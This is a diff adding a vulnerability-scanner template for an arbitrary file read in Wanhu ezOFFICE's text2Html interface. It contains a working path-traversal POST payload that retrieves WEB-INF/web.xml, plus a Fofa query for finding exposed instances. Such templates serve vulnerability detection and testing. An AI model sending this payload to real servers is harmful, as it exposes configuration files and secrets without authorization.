@@ -1,0 +1,23 @@
+id: wanhu-ezoffice-text2html-fileread
+
+info:
+  name: 万户协同办公平台ezoffice text2Html接口任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞。
+    Fofa: app="万户网络-ezOFFICE"
+  reference:
+    - https://mp.weixin.qq.com/s/m92W7sM8KWonMvNXbRPFlQ
+  tags: wanhu,ezoffice,text2html,fileread
+  created: 2024/02/28
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /defaultroot/convertFile/text2Html.controller
+      body: saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+    expression: response.status == 200 && response.body.bcontains(b'web-app xmlns=') && response.headers["content-type"].contains("text/html")
+expression: r0()
